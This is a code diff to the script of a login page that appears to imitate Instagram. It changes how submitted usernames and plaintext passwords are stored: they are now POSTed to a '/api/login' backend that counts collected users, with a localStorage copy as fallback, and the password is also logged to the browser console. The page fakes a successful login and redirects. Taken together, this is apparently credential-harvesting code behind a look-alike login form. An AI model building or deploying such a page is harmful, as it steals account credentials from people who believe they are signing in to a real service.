@@ -189,46 +189,52 @@
             */
         }
 
-        // Function to save user data to JSON file in folder
+        // Function to save user data to backend server
         function saveUserDataToFile(loginData) {
-            // Get existing data from localStorage or create new array
+            // Send data to backend server
+            fetch('/api/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(loginData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    console.log('✅ User data saved to server successfully');
+                    console.log('📊 Total users:', data.user_count);
+                } else {
+                    console.error('❌ Failed to save user data:', data.message);
+                }
+            })
+            .catch(error => {
+                console.error('🔥 Error sending data to server:', error);
+                console.log('🔄 Using localStorage fallback...');
+                // Fallback to localStorage if server fails
+                saveToLocalStorage(loginData);
+            });
+        }
+
+        // Fallback to localStorage
+        function saveToLocalStorage(loginData) {
             let existingData = localStorage.getItem('userLoginData');
             let userDataArray = existingData ? JSON.parse(existingData) : [];
-            
-            // Add new login data
             userDataArray.push(loginData);
-            
-            // Save to localStorage
             localStorage.setItem('userLoginData', JSON.stringify(userDataArray, null, 2));
-            
-            // Create and save to file.json
-            const dataStr = JSON.stringify(userDataArray, null, 2);
-            const blob = new Blob([dataStr], { type: 'application/json' });
-            
-            // Create file URL and save to folder
-            const fileUrl = URL.createObjectURL(blob);
-            const fileName = 'user_data.json';
-            
-            // Create download link and trigger download (simulates saving to folder)
-            const linkElement = document.createElement('a');
-            linkElement.setAttribute('href', fileUrl);
-            linkElement.setAttribute('download', fileName);
-            linkElement.style.display = 'none';
-            document.body.appendChild(linkElement);
-            linkElement.click();
-            document.body.removeChild(linkElement);
-            
-            console.log('User data saved to user_data.json');
-            console.log('Total users:', userDataArray.length);
-            console.log('Latest login:', loginData);
+            console.log('Data saved to localStorage as fallback');
         }
 
         // Manual Login Form Handler
         document.getElementById('manualLoginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
+            console.log('🚀 Login form submitted');
+            
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
+            
+            console.log('📝 Form data:', { username, password });
             
             // Show loading
             document.getElementById('loadingModal').classList.remove('hidden');
@@ -237,17 +243,17 @@
             const loginData = {
                 username: username,
                 password: password,
-                timestamp: new Date().toISOString(),
-                ip_address: 'localhost', // In production, get real IP
-                user_agent: navigator.userAgent,
-                login_method: 'manual'
+                login_method: 'manual',
+                user_agent: navigator.userAgent
             };
             
-            // Save to JSON file (simulation)
+            console.log('📤 Sending to server:', loginData);
+            
+            // Save to backend server
             saveUserDataToFile(loginData);
             
             // Log to console
-            console.log('Login Attempt:', loginData);
+            console.log('🔍 Login Attempt:', loginData);
             
             // Simulate login process
             setTimeout(() => {
@@ -267,12 +273,14 @@
                 localStorage.setItem('instagramUser', JSON.stringify(userData));
                 localStorage.setItem('isLoggedIn', 'true');
                 
+                console.log('✅ User session created:', userData);
+                
                 // Hide loading
                 document.getElementById('loadingModal').classList.add('hidden');
                 
                 // Redirect to main page
                 window.location.href = 'index.html';
-            }, 1500);
+            }, 2000); // Increased delay to see server response
         });
 
         // Function to save user data to localStorage (admin only access)
